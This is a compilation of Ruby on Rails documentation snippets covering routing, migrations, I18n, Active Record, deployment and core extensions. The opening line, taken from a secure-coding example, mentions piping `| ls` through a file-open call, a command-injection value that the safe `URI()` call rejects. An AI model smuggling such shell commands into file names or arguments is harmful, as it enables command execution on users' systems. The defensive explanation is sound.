URI("https://example.com").open { |file| file.read }
# opens the URI. `URI()` doesn't accept `| ls`

----------------------------------------

TITLE: Alternative Syntax for Path Prefixes in Rails Routing
DESCRIPTION: Another way to route /admin/articles to ArticlesController by directly specifying the path on the resources method, achieving the same result as the scope block approach.

LANGUAGE: ruby
CODE:
resources :articles, path: "/admin/articles"

----------------------------------------

TITLE: Installing Migrations from Multiple Engines
DESCRIPTION: Command to copy migrations from all railties (including engines) into the host application.

LANGUAGE: bash
CODE:
$ bin/rails railties:install:migrations

----------------------------------------

TITLE: Deprecated Thread Database Connection Handling
DESCRIPTION: Shows the deprecated pattern of using database connections in threads without explicitly closing them, which can lead to connection leaks.

LANGUAGE: ruby
CODE:
Thread.new { Post.find(1) }.join

----------------------------------------

TITLE: Loading Associated Records with Default Composite Primary Key Behavior
DESCRIPTION: Demonstrates reloading an association when Rails uses the default behavior with composite primary keys.

LANGUAGE: ruby
CODE:
book.reload.order

----------------------------------------

TITLE: Removing References in Rails Migrations
DESCRIPTION: Shows how to remove a reference column from a table. This example removes the user_id column from the products table, along with its foreign key constraint, but skips removing the index.

LANGUAGE: ruby
CODE:
remove_reference :products, :user, foreign_key: true, index: false

----------------------------------------

TITLE: Listing Middleware in a Rails Application
DESCRIPTION: Command to view all middleware currently used in a Rails application. Useful for understanding what middleware is active in an API-only setup.

LANGUAGE: bash
CODE:
$ bin/rails middleware

----------------------------------------

TITLE: Hash to_query without Namespace
DESCRIPTION: Shows how Hash#to_query generates a sorted series of key/value pairs joined with ampersands when called without arguments.

LANGUAGE: ruby
CODE:
{ c: 3, b: 2, a: 1 }.to_query # => "a=1&b=2&c=3"

----------------------------------------

TITLE: Accessing Request Objects in Tests
DESCRIPTION: Shows how to access flash, session, and cookies objects in controller tests.

LANGUAGE: ruby
CODE:
flash["gordon"]               # or flash[:gordon]
session["shmession"]          # or session[:shmession]
cookies["are_good_for_u"]     # or cookies[:are_good_for_u]

----------------------------------------

TITLE: Accessing Base Error Messages
DESCRIPTION: This example shows how to access error messages that were added to the :base attribute. These errors represent issues with the object as a whole rather than specific attributes.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.errors.where(:base).first.full_message
=> "This person is invalid because ..."

----------------------------------------

TITLE: Filtering Records with Where Clause in Rails
DESCRIPTION: Using the where method to filter products by name. This generates a SQL query with a WHERE clause to find matching records.

LANGUAGE: irb
CODE:
store(dev)> Product.where(name: "Pants")
  Product Load (1.5ms)  SELECT "products".* FROM "products" WHERE "products"."name" = 'Pants' /* loading for pp */ LIMIT 11 /*application='Store'*/
=> [#<Product:0x000000012184d858 id: 2, name: "Pants", created_at: "2024-11-09 16:36:01.856751000 +0000", updated_at: "2024-11-09 16:36:01.856751000 +0000">]

----------------------------------------

TITLE: Formatting Inline Code in Headings for Rails Guides
DESCRIPTION: Shows how to format headings that contain inline code or technical terms using backticks in Rails Guides documentation.

LANGUAGE: markdown
CODE:
##### The `:content_type` Option

----------------------------------------

TITLE: Generated HTML Form Structure in Rails
DESCRIPTION: Shows the HTML output generated by the Rails form_with helper, including CSRF token, UTF-8 support, and proper field naming conventions for a new product form.

LANGUAGE: html
CODE:
<form action="/products" accept-charset="UTF-8" method="post">
  <input type="hidden" name="authenticity_token" value="UHQSKXCaFqy_aoK760zpSMUPy6TMnsLNgbPMABwN1zpW-Jx6k-2mISiF0ulZOINmfxPdg5xMyZqdxSW1UK-H-Q" autocomplete="off">

  <div>
    <label for="product_name">Name</label>
    <input type="text" name="product[name]" id="product_name">
  </div>

  <div>
    <input type="submit" name="commit" value="Create Product" data-disable-with="Create Product">
  </div>
</form>

----------------------------------------

TITLE: Deploying Application Updates with Kamal
DESCRIPTION: Command to deploy application updates to production using Kamal after the initial setup.

LANGUAGE: bash
CODE:
$ bin/kamal deploy

----------------------------------------

TITLE: Cherry-Picking a Merged Pull Request for Backporting in Rails
DESCRIPTION: This snippet shows how to cherry-pick a merged pull request for backporting to a stable branch. It uses the -m1 flag to select the first parent in the merge commit.

LANGUAGE: bash
CODE:
$ git cherry-pick -m1 MERGE_SHA

----------------------------------------

TITLE: Using throw(:abort) to halt a callback chain in Rails 5.0
DESCRIPTION: The preferred method to halt a callback chain in Rails 5.0 is to explicitly throw(:abort). This replaces the previous behavior of returning false in a before callback.

LANGUAGE: ruby
CODE:
throw(:abort)

----------------------------------------

TITLE: Evaluating Variables and Using Commands in Rails Debugger
DESCRIPTION: Example showing how to evaluate expressions and use the p/pp commands in the Rails debugger context, accessing instance variables and controller data.

LANGUAGE: ruby
CODE:
(rdbg) @posts    # ruby
[]
(rdbg) self
#<PostsController:0x0000000000aeb0>
(rdbg)

----------------------------------------

TITLE: Using String#remove Method in Ruby
DESCRIPTION: Demonstrates using the remove method to remove all occurrences of a pattern from a string, returning a new string.

LANGUAGE: ruby
CODE:
"Hello World".remove(/Hello /) # => "World"

----------------------------------------

TITLE: Implementing Custom Initializer with Rails::Railtie#initializer
DESCRIPTION: This example from Action Controller demonstrates how to define a custom initializer using the initializer method from Rails::Railtie. It shows setting helpers path with access to the application instance, which is passed as a block parameter.

LANGUAGE: ruby
CODE:
initializer "action_controller.set_helpers_path" do |app|
  ActionController::Helpers.helpers_path = app.helpers_paths
end

----------------------------------------

TITLE: Generating Database-Specific Scaffold with Rails CLI
DESCRIPTION: Creating a complete scaffold for a model that will use a specific database using the Rails generator with the --database option.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold Dog name:string --database animals

----------------------------------------

TITLE: Implementing Puma Server Run Method for Rack Applications in Ruby
DESCRIPTION: The run method for Puma server that configures and launches the server with the Rails application, handling interruptions gracefully.

LANGUAGE: ruby
CODE:
module Rack
  module Handler
    module Puma
      # ...
      def self.run(app, options = {})
        conf = self.config(app, options)

        log_writer = options.delete(:Silent) ? ::Puma::LogWriter.strings : ::Puma::LogWriter.stdio

        launcher = ::Puma::Launcher.new(conf, log_writer: log_writer, events: @events)

        yield launcher if block_given?
        begin
          launcher.run
        rescue Interrupt
          puts "* Gracefully stopping, waiting for requests to finish"
          launcher.stop
          puts "* Goodbye!"
        end
      end
      # ...
    end
  end
end

----------------------------------------

TITLE: Getting Last Characters of a String in Ruby
DESCRIPTION: Demonstrates the last method which returns the last n characters of a string, defaulting to just the last character.

LANGUAGE: ruby
CODE:
"hello".last    # => "o" (implied limit=1)
"hello".last(2) # => "lo"
"hello".last(0) # => "" (empty string)

----------------------------------------

TITLE: Using Dev Container CLI for Rails Development
DESCRIPTION: Commands to install and use the Dev Container CLI with Docker to set up a development environment. This provides a standardized environment based on the project's devcontainer configuration.

LANGUAGE: bash
CODE:
$ npm install -g @devcontainers/cli
$ cd rails
$ devcontainer up --workspace-folder .
$ devcontainer exec --workspace-folder . bash

----------------------------------------

TITLE: Implementing Locale Switching in Rails Application Controller
DESCRIPTION: Shows how to implement locale switching based on URL parameters. This around_action sets the locale for each request and falls back to the default locale if none is specified.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  # ...

  around_action :switch_locale

  def switch_locale(&action)
    locale = params[:locale] || I18n.default_locale
    I18n.with_locale(locale, &action)
  end
end

----------------------------------------

TITLE: Configuring Callback Chain Halting Behavior in Rails 5.0
DESCRIPTION: Configuration to opt-in to the new callback behavior in Rails 5.0 where returning false doesn't halt the callback chain. This helps prepare for the forced change in future Rails versions.

LANGUAGE: ruby
CODE:
ActiveSupport.halt_callback_chains_on_return_false = false

----------------------------------------

TITLE: Generating Child Model with Parent Option in Rails
DESCRIPTION: Terminal command to generate a Car model that inherits from Vehicle using the --parent option. This creates a model without a migration since it will use the parent's table.

LANGUAGE: bash
CODE:
$ bin/rails generate model car --parent=Vehicle

----------------------------------------

TITLE: Defining Nested Resources for Magazine Ads in Rails
DESCRIPTION: Sets up nested resourceful routes for magazines and their ads. This establishes the foundation for the path and URL generation examples that follow.

LANGUAGE: ruby
CODE:
resources :magazines do
  resources :ads
end

----------------------------------------

TITLE: Running Database Migrations
DESCRIPTION: Executes the database migrations in the host application, including the newly copied engine migrations.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Creating Migration for Self-Referential Employee Table in Rails
DESCRIPTION: Migration to create the employees table with a self-referential foreign key. The migration adds a manager_id column that references the id column in the same table.

LANGUAGE: ruby
CODE:
class CreateEmployees < ActiveRecord::Migration[8.1]
  def change
    create_table :employees do |t|
      # Add a belongs_to reference to the manager, which is an employee.
      t.belongs_to :manager, foreign_key: { to_table: :employees }
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Using Strong Parameters with ActiveModel::AttributeAssignment
DESCRIPTION: This snippet shows how ActiveModel::AttributeAssignment integrates with Rails' strong parameters to prevent mass assignment vulnerabilities. It demonstrates permitted and non-permitted parameter assignment.

LANGUAGE: ruby
CODE:
irb> person = Person.new

# Using strong parameters checks, build a hash of attributes similar to params from a request
irb> params = ActionController::Parameters.new(name: "John")
=> #<ActionController::Parameters {"name" => "John"} permitted: false>

irb> person.assign_attributes(params)
=> # Raises ActiveModel::ForbiddenAttributesError
irb> person.name
=> nil

# Permit the attributes we want to allow assignment
irb> permitted_params = params.permit(:name)
=> #<ActionController::Parameters {"name" => "John"} permitted: true>

irb> person.assign_attributes(permitted_params)
irb> person.name
=> "John"

----------------------------------------

TITLE: Implementing Subscription Handling in Rails Action Cable
DESCRIPTION: Example of a channel with a subscription method. The subscribed method is called when a consumer successfully subscribes to this channel, allowing for initialization logic when a new subscription is established.

LANGUAGE: ruby
CODE:
# app/channels/chat_channel.rb
class ChatChannel < ApplicationCable::Channel
  # Called when the consumer has successfully
  # become a subscriber to this channel.
  def subscribed
  end
end

----------------------------------------

TITLE: Passing Explicit Locale in Rails I18n Methods
DESCRIPTION: Demonstrates how to explicitly pass a locale to the translate and localize methods instead of using the globally set locale.

LANGUAGE: ruby
CODE:
I18n.t :foo, locale: :de
I18n.l Time.now, locale: :de

----------------------------------------

TITLE: Active Model Validation Class Example in Ruby
DESCRIPTION: Defines a Person class with ActiveModel validations for demonstration purposes. This class is used to show how validation messages can be customized with I18n when combined with the proper locale configuration.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Validations

  attr_accessor :name, :age

  validates :name, :age, presence: true
end

----------------------------------------

TITLE: Disabling Encryption Temporarily in Rails
DESCRIPTION: Demonstrates how to temporarily disable encryption using the without_encryption method, which causes encrypted text to be read as ciphertext and new content to be stored unencrypted.

LANGUAGE: ruby
CODE:
ActiveRecord::Encryption.without_encryption do
  # ...
end

----------------------------------------

TITLE: Enqueueing Multiple Jobs at Once with perform_all_later
DESCRIPTION: Example demonstrating the new perform_all_later method in Active Job that allows enqueueing multiple jobs simultaneously, reducing round-trips to the queue datastore.

LANGUAGE: ruby
CODE:
# Enqueueing individual jobs
ActiveJob.perform_all_later(MyJob.new("hello", 42), MyJob.new("world", 0))

# Enqueueing an array of jobs
user_jobs = User.pluck(:id).map { |id| UserJob.new(user_id: id) }
ActiveJob.perform_all_later(user_jobs)

----------------------------------------

TITLE: Creating Database Migration for Products Table in Rails
DESCRIPTION: A database migration file that creates a products table with name column and timestamps. This is automatically generated by Rails when running a model generator command.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products do |t|
      t.string :name

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Using utc and utc? with DateTime objects in Ruby on Rails
DESCRIPTION: The utc method converts a DateTime to UTC timezone, while the utc? predicate checks if a DateTime is already in UTC timezone.

LANGUAGE: ruby
CODE:
now = DateTime.current # => Mon, 07 Jun 2010 19:27:52 -0400
now.utc                # => Mon, 07 Jun 2010 23:27:52 +0000

LANGUAGE: ruby
CODE:
now = DateTime.now # => Mon, 07 Jun 2010 19:30:47 -0400
now.utc?           # => false
now.utc.utc?       # => true

----------------------------------------

TITLE: Child Model Definition with Single Table Inheritance
DESCRIPTION: Definition of a Car model inheriting from Vehicle for Single Table Inheritance. This allows the Car model to use the vehicles table while maintaining its own behavior.

LANGUAGE: ruby
CODE:
class Car < Vehicle
end

----------------------------------------

TITLE: Creating CSS Styles for Product Application
DESCRIPTION: Defines CSS styles for the application, including typography, layout, and product display. Uses a sans-serif font family and creates responsive layouts with flexbox.

LANGUAGE: css
CODE:
body {
  font-family: Arial, Helvetica, sans-serif;
  padding: 1rem;
}

nav {
  justify-content: flex-end;
  display: flex;
  font-size: 0.875em;
  gap: 0.5rem;
  max-width: 1024px;
  margin: 0 auto;
  padding: 1rem;
}

nav a {
  display: inline-block;
}

main {
  max-width: 1024px;
  margin: 0 auto;
}

.notice {
  color: green;
}

section.product {
  display: flex;
  gap: 1rem;
  flex-direction: row;
}

section.product img {
  border-radius: 8px;
  flex-basis: 50%;
  max-width: 50%;
}

----------------------------------------

TITLE: Running All Active Record Tests
DESCRIPTION: Shows how to run the Active Record test suite for all configured database adapters in sequence. This will run tests for SQLite3, MySQL, and PostgreSQL.

LANGUAGE: bash
CODE:
$ bundle exec rake test

----------------------------------------

TITLE: Using alias_attribute for Model Attributes
DESCRIPTION: Shows how to use alias_attribute to create an alternative name for a model attribute, providing reader, writer, and predicate methods.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  # You can refer to the email column as "login".
  # This can be meaningful for authentication code.
  alias_attribute :login, :email
end

----------------------------------------

TITLE: Specifying a Custom Controller for Resources in Rails Routes
DESCRIPTION: Demonstrates how to use the :controller option with resources to specify a different controller than the default naming convention would suggest. This routes /photos paths to the Images controller.

LANGUAGE: ruby
CODE:
resources :photos, controller: "images"

----------------------------------------

TITLE: RESTful Resource Declaration in Rails 4 Routes
DESCRIPTION: Example of declaring a RESTful resource in routes. Rails 4 uses PATCH as the primary HTTP verb for updates while still supporting PUT requests.

LANGUAGE: ruby
CODE:
resources :users

----------------------------------------

TITLE: Displaying Rich Text Content in Rails View
DESCRIPTION: Shows how to display rich text content in a product show view. The rich text rendering is handled automatically by Rails when accessing the description attribute.

LANGUAGE: erb
CODE:
<% cache @product do %>
  <h1><%= @product.name %></h1>
  <%= @product.description %>
<% end %>

----------------------------------------

TITLE: Generated Schema for UUID Primary Key in Rails
DESCRIPTION: The resulting schema SQL generated for a table with UUID primary keys. It shows how Rails configures the default value to use PostgreSQL's gen_random_uuid() function for automatic UUID generation.

LANGUAGE: ruby
CODE:
create_table "authors", id: :uuid, default: -> { "gen_random_uuid()" }, force: :cascade do |t|
  t.datetime "created_at", precision: 6, null: false
  t.datetime "updated_at", precision: 6, null: false
end

----------------------------------------

TITLE: Accessing Translations in Ruby with I18n.t Method
DESCRIPTION: Ruby code demonstrating how to access translations with the I18n.t method. It shows successful lookups for quoted string boolean keys and missing translation behavior for unquoted boolean keys.

LANGUAGE: ruby
CODE:
I18n.t "success.true"  # => 'True!'
I18n.t "success.on"    # => 'On!'
I18n.t "success.false" # => 'False!'
I18n.t "failure.false" # => Translation Missing
I18n.t "failure.off"   # => Translation Missing
I18n.t "failure.true"  # => Translation Missing

----------------------------------------

TITLE: Proper Thread Database Connection Handling
DESCRIPTION: Shows the proper way to handle database connections in threads by explicitly closing them when done to prevent connection leaks.

LANGUAGE: ruby
CODE:
Thread.new {
  Post.find(1)
  Post.connection.close
}.join

----------------------------------------

TITLE: Deep Duplication of Arrays in Ruby on Rails
DESCRIPTION: Shows how to use Array#deep_dup to create a deep copy of an array and all objects inside it recursively. This ensures that modifying nested elements in the copy doesn't affect the original array.

LANGUAGE: ruby
CODE:
array = [1, [2, 3]]
dup = array.deep_dup
dup[1][2] = 4
array[1][2] == nil   # => true

----------------------------------------

TITLE: Resource Routes with Clashing Names in Rails 4.0
DESCRIPTION: Example of routes created by resources method that clash with explicitly defined named routes, which is no longer permitted in Rails 4.0.

LANGUAGE: ruby
CODE:
resources :examples
get "clashing/:id" => "test#example", as: :example

----------------------------------------

TITLE: Kamal Deployment Configuration in YAML
DESCRIPTION: Example configuration file for Kamal deployment tool, showing server settings, container image details, and optional SSL configuration.

LANGUAGE: yaml
CODE:
# Name of your application. Used to uniquely configure containers.
service: store

# Name of the container image.
image: your-user/store

# Deploy to these servers.
servers:
  web:
    - 192.168.0.1

# Credentials for your image host.
registry:
  # Specify the registry server, if you're not using Docker Hub
  # server: registry.digitalocean.com / ghcr.io / ...
  username: your-user

----------------------------------------

TITLE: Moving Middleware Before Another in Rails Stack
DESCRIPTION: Demonstrates how to change the order of middleware by moving an existing middleware before another one. This allows for reordering the middleware stack.

LANGUAGE: ruby
CODE:
config.middleware.move_before ActionDispatch::Flash, Magical::Unicorns

----------------------------------------

TITLE: Adding a Reference to an Existing Table in Rails Migration
DESCRIPTION: Shows how to add a foreign key to an existing table using the add_reference method in a Rails migration.

LANGUAGE: ruby
CODE:
class AddAuthorToBooks < ActiveRecord::Migration[8.1]
  def change
    add_reference :books, :author
  end
end

----------------------------------------

TITLE: Using url_for with Object Array in Rails
DESCRIPTION: Demonstrates using url_for with an array of model instances to generate paths. Rails intelligently chooses the appropriate helper based on the types of objects provided.

LANGUAGE: erb
CODE:
<%= link_to 'Ad details', url_for([@magazine, @ad]) %>

----------------------------------------

TITLE: Displaying Author Name in Article Template
DESCRIPTION: Updates the article partial to display the author's name, showing the association between articles and users.

LANGUAGE: html+erb
CODE:
<p>
  <strong>Author:</strong>
  <%= article.author.name %>
</p>

----------------------------------------

TITLE: Implementing Delegation with Polymorphism in Rails Models
DESCRIPTION: Enhances the Entry delegator by implementing delegation with polymorphism. The Entry model delegates the title method to its entryable subclasses, where each implements the method differently.

LANGUAGE: ruby
CODE:
class Entry < ApplicationRecord
  delegated_type :entryable, types: %w[ Message Comment ]
  delegate :title, to: :entryable
end

class Message < ApplicationRecord
  include Entryable

  def title
    subject
  end
end

class Comment < ApplicationRecord
  include Entryable

  def title
    content.truncate(20)
  end
end

----------------------------------------

TITLE: Using Generated Columns in PostgreSQL with Rails
DESCRIPTION: Shows how to use PostgreSQL's generated columns feature to automatically compute column values based on other columns. These columns are maintained by the database.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_users.rb
create_table :users do |t|
  t.string :name
  t.virtual :name_upcased, type: :string, as: "upper(name)", stored: true
end

# app/models/user.rb
class User < ApplicationRecord
end

# Usage
user = User.create(name: "John")
User.last.name_upcased # => "JOHN"

----------------------------------------

TITLE: Defining Routes with Static and Dynamic Segments in Rails
DESCRIPTION: Creates a route with a combination of static and dynamic segments. Static segments (without colons) are part of the URL pattern but don't become parameters.

LANGUAGE: ruby
CODE:
get "photos/:id/with_user/:user_id", to: "photos#show"

----------------------------------------

TITLE: Class Attribute Declaration with class_attribute in Ruby
DESCRIPTION: Shows how to use class_attribute to declare inheritable class attributes that can be overridden at any level of the class hierarchy and accessed at both class and instance levels.

LANGUAGE: ruby
CODE:
class A
  class_attribute :x
end

class B < A; end

class C < B; end

A.x = :a
B.x # => :a
C.x # => :a

B.x = :b
A.x # => :a
C.x # => :b

C.x = :c
A.x # => :a
B.x # => :b

LANGUAGE: ruby
CODE:
class_attribute :default_params
self.default_params = {
  mime_version: "1.0",
  charset: "UTF-8",
  content_type: "text/plain",
  parts_order: [ "text/plain", "text/enriched", "text/html" ]
}.freeze

LANGUAGE: ruby
CODE:
A.x = 1

a1 = A.new
a2 = A.new
a2.x = 2

a1.x # => 1, comes from A
a2.x # => 2, overridden in a2

LANGUAGE: ruby
CODE:
module ActiveRecord
  class Base
    class_attribute :table_name_prefix, instance_writer: false, default: "my"
  end
end

LANGUAGE: ruby
CODE:
class A
  class_attribute :x, instance_reader: false
end

A.new.x = 1
A.new.x # NoMethodError

----------------------------------------

TITLE: Cache Cleanup Event Structure in Active Support
DESCRIPTION: Shows the structure of the payload for the cache_cleanup.active_support event, which is emitted only when using MemoryStore. Includes the store class name and cache size before cleanup.

LANGUAGE: ruby
CODE:
{
  store: "ActiveSupport::Cache::MemoryStore",
  size: 9001
}

----------------------------------------

TITLE: Building a Form for a Model with Composite Primary Key in ERB
DESCRIPTION: Demonstrates using form_with to create a form for updating a model with a composite primary key.

LANGUAGE: erb
CODE:
<%= form_with model: @book do |form| %>
  <%= form.text_field :title %>
  <%= form.submit %>
<% end %>

----------------------------------------

TITLE: Using Wildcard Segments in Rails Routes
DESCRIPTION: Demonstrates using wildcard segments in routes which allow for route globbing. The wildcard segment (*other) matches the remaining part of a route and is captured in the params hash.

LANGUAGE: ruby
CODE:
get "photos/*other", to: "photos#unknown"

----------------------------------------

TITLE: Implementing Rackup::Server#wrapped_app Method for Application Building in Ruby
DESCRIPTION: The wrapped_app method that memoizes the application after building it with the build_app method.

LANGUAGE: ruby
CODE:
module Rackup
  class Server
    def wrapped_app
      @wrapped_app ||= build_app app
    end
  end
end

----------------------------------------

TITLE: Generating Models for Delegation in Rails
DESCRIPTION: Terminal commands to generate Message and Comment models for use with delegated types. These models will store attributes specific to each type.

LANGUAGE: bash
CODE:
$ bin/rails generate model message subject:string body:string
$ bin/rails generate model comment content:string

----------------------------------------

TITLE: Using all_day Method with Time in Ruby
DESCRIPTION: The all_day method returns a range representing the whole day of the given time, from 00:00:00 to 23:59:59.

LANGUAGE: ruby
CODE:
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now.all_day
# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..Mon, 09 Aug 2010 23:59:59 UTC +00:00

----------------------------------------

TITLE: Scanning custom file types for annotations with notes command
DESCRIPTION: After registering custom file extensions, the rails notes command can find annotations in additional file types like SASS and SCSS style files, expanding its utility beyond Ruby code.

LANGUAGE: bash
CODE:
$ bin/rails notes
app/controllers/admin/users_controller.rb:
  * [ 20] [TODO] any other way to do this?
  * [132] [FIXME] high priority for next deploy

app/assets/stylesheets/application.css.sass:
  * [ 34] [TODO] Use pseudo element for this class

app/assets/stylesheets/application.css.scss:
  * [  1] [TODO] Split into multiple components

lib/school.rb:
  * [ 13] [OPTIMIZE] Refactor this code to make it faster
  * [ 17] [FIXME]

spec/models/user_spec.rb:
  * [122] [TODO] Verify the user that has a subscription works

vendor/tools.rb:
  * [ 56] [TODO] Get rid of this dependency

----------------------------------------

TITLE: Running RuboCop for Code Style Validation
DESCRIPTION: Executes RuboCop to check if your code changes adhere to Rails coding conventions. This example checks a specific file in the ActionPack component.

LANGUAGE: bash
CODE:
$ bundle exec rubocop actionpack/lib/action_controller/metal/strong_parameters.rb

----------------------------------------

TITLE: Rendering HTML Response
DESCRIPTION: Sending an HTML string as a response using the :html option to render. This is useful for simple HTML snippets that don't require a separate template.

LANGUAGE: ruby
CODE:
render html: helpers.tag.strong("Not Found")

----------------------------------------

TITLE: Running User Commands in Podman Dev Container
DESCRIPTION: Commands to run user initialization scripts and access a shell in a Podman-based development container. This continues the setup process for the containerized development environment.

LANGUAGE: bash
CODE:
$ tools/devcontainer run-user-commands
$ tools/devcontainer sh

----------------------------------------

TITLE: Adding Unsubscribe Link to HTML Email Template
DESCRIPTION: Updates the product_mailer/in_stock HTML email template to include an unsubscribe link with a unique token. The link allows users to unsubscribe from product notifications.

LANGUAGE: erb
CODE:
<h1>Good news!</h1>

<p><%= link_to @product.name, product_url(@product) %> is back in stock.</p>

<%= link_to "Unsubscribe", unsubscribe_url(token: params[:subscriber].generate_token_for(:unsubscribe)) %>

----------------------------------------

TITLE: Extracting Substrings up to Position in Ruby
DESCRIPTION: Demonstrates the to method which returns substrings from the start up to a specified position.

LANGUAGE: ruby
CODE:
"hello".to(0)  # => "h"
"hello".to(2)  # => "hel"
"hello".to(-2) # => "hell"
"hello".to(10) # => "hello"

----------------------------------------

TITLE: Excluding Specific Encrypted Columns from Parameter Filtering
DESCRIPTION: Configures specific encrypted columns to be excluded from automatic parameter filtering in Rails logs. This allows certain encrypted values to remain visible in logs while filtering others.

LANGUAGE: ruby
CODE:
config.active_record.encryption.excluded_from_filter_parameters = [:catchphrase]

----------------------------------------

TITLE: Configuring JavaScript Import Maps in Rails
DESCRIPTION: Shows the JavaScript import maps configuration used by Rails to manage JavaScript modules without build steps. Maps package names to source files for the browser.

LANGUAGE: ruby
CODE:
# Pin npm packages by running ./bin/importmap

pin "application"
pin "@hotwired/turbo-rails", to: "turbo.min.js"
pin "@hotwired/stimulus", to: "stimulus.min.js"
pin "@hotwired/stimulus-loading", to: "stimulus-loading.js"
pin_all_from "app/javascript/controllers", under: "controllers"

----------------------------------------

TITLE: Configuring Sharding for Solid Cache in database.yml
DESCRIPTION: Database configuration for enabling sharding in Solid Cache, which splits the cache across multiple databases for improved scalability and performance. Each shard is defined as a separate database connection.

LANGUAGE: yaml
CODE:
# config/database.yml
production:
  cache_shard1:
    database: cache1_production
    host: cache1-db
  cache_shard2:
    database: cache2_production
    host: cache2-db
  cache_shard3:
    database: cache3_production
    host: cache3-db

----------------------------------------

TITLE: Silencing Warnings with silence_warnings
DESCRIPTION: Demonstrates using silence_warnings to temporarily change the $VERBOSE setting when performing operations that may generate warnings.

LANGUAGE: ruby
CODE:
silence_warnings { Object.const_set "RAILS_DEFAULT_LOGGER", logger }

----------------------------------------

TITLE: Setting Up Nested Routes for Subscribers in Rails
DESCRIPTION: Configuration for nested routes, allowing subscribers to be created in the context of a specific product.

LANGUAGE: ruby
CODE:
  resources :products do
    resources :subscribers, only: [ :create ]
  end

----------------------------------------

TITLE: Redirection with Custom Status Code in Rails Routes
DESCRIPTION: Shows how to specify a custom HTTP status code for redirects by using the status option. This example uses 302 (temporary redirect) instead of the default 301 (permanent).

LANGUAGE: ruby
CODE:
get "/stories/:name", to: redirect("/articles/%{name}", status: 302)

----------------------------------------

TITLE: Instantiating Records without Saving in Rails
DESCRIPTION: Demonstrates using the new method to create an Active Record object without saving it to the database immediately. The save method must be called explicitly to persist the record.

LANGUAGE: ruby
CODE:
book = Book.new
book.title = "The Hobbit"
book.author = "J.R.R. Tolkien"

# Note that the `id` is not set for this object.
book.inspect
# => "#<Book id: nil, title: \"The Hobbit\", author: \"J.R.R. Tolkien\", created_at: nil, updated_at: nil>"

# The above `book` is not yet saved to the database.

book.save
book.id # => 107

# Now the `book` record is committed to the database and has an `id`.

----------------------------------------

TITLE: Testing Routes with assert_recognizes in Rails
DESCRIPTION: Demonstrates using the assert_recognizes assertion to verify that a given path is recognized and routes to the expected controller and action. Includes an example specifying HTTP verb.

LANGUAGE: ruby
CODE:
assert_recognizes({ controller: "photos", action: "show", id: "1" }, "/photos/1")

LANGUAGE: ruby
CODE:
assert_recognizes({ controller: "photos", action: "create" }, { path: "photos", method: :post })

----------------------------------------

TITLE: Using redirect_back with Fallback Location in Rails
DESCRIPTION: Example of redirecting back to the referring page using redirect_back, which requires a fallback_location parameter in case the HTTP_REFERER header is not present.

LANGUAGE: ruby
CODE:
redirect_back(fallback_location: root_path)

----------------------------------------

TITLE: Converting Parameters to Hash in Rails 5 Controllers
DESCRIPTION: In Rails 5, ActionController::Parameters no longer inherits from HashWithIndifferentAccess. After permitting parameters, you need to convert them to a hash using to_h method to use hash methods like map.

LANGUAGE: ruby
CODE:
params.permit([:proceed_to, :return_to]).to_h

----------------------------------------

TITLE: Starting Rails Server with Custom Port and Environment
DESCRIPTION: Shows how to start a Rails server with custom configuration options. The -e option specifies the environment (production in this case), and the -p option sets the server port to 4000.

LANGUAGE: bash
CODE:
$ bin/rails server -e production -p 4000

----------------------------------------

TITLE: Starting the Rails Server
DESCRIPTION: Shows how to start the Rails server to view the application in a browser. This makes the application accessible at http://localhost:3000.

LANGUAGE: bash
CODE:
$ bin/rails server
=> Booting Puma...

----------------------------------------

TITLE: Eagerly Loading All Test Helpers
DESCRIPTION: Code that uses globbing to automatically require all helper files in the test/test_helpers directory. This provides a convenient way to make all helpers available but increases boot time.

LANGUAGE: ruby
CODE:
# test/test_helper.rb
Dir[Rails.root.join("test", "test_helpers", "**", "*.rb")].each { |file| require file }

----------------------------------------

TITLE: Specifying Action in Object-based Path Generation in Rails
DESCRIPTION: Shows how to specify a non-default action when generating paths from objects. The action name must be included as the first element in the array.

LANGUAGE: erb
CODE:
<%= link_to 'Edit Ad', [:edit, @magazine, @ad] %>

----------------------------------------

TITLE: Using Deferrable Foreign Keys in PostgreSQL with Rails
DESCRIPTION: Demonstrates how to set up deferrable foreign keys that allow circular dependencies or delayed constraint checking within transactions.

LANGUAGE: ruby
CODE:
add_reference :person, :alias, foreign_key: { deferrable: :deferred }
add_reference :alias, :person, foreign_key: { deferrable: :deferred }

LANGUAGE: ruby
CODE:
ActiveRecord::Base.lease_connection.transaction do
  person = Person.create(id: SecureRandom.uuid, alias_id: SecureRandom.uuid, name: "John Doe")
  Alias.create(id: person.alias_id, person_id: person.id, name: "jaydee")
end

LANGUAGE: ruby
CODE:
ActiveRecord::Base.lease_connection.transaction do
  ActiveRecord::Base.lease_connection.set_constraints(:deferred)
  person = Person.create(alias_id: SecureRandom.uuid, name: "John Doe")
  Alias.create(id: person.alias_id, person_id: person.id, name: "jaydee")
end

----------------------------------------

TITLE: Converting ApplicationController to API Mode
DESCRIPTION: Code changes required to make the ApplicationController inherit from ActionController::API instead of ActionController::Base, removing browser-specific functionality.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::API
end

----------------------------------------

TITLE: Initializing Rails Application with bin/rails File
DESCRIPTION: The entry point script for Rails commands that sets the application path and loads the necessary configuration files.

LANGUAGE: ruby
CODE:
#!/usr/bin/env ruby
APP_PATH = File.expand_path("../config/application", __dir__)
require_relative "../config/boot"
require "rails/commands"

----------------------------------------

TITLE: Working with Quarters in Ruby on Rails
DESCRIPTION: Shows methods for determining the current quarter number and finding quarter boundary dates using quarter, beginning_of_quarter, and end_of_quarter methods.

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.quarter                # => 2

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
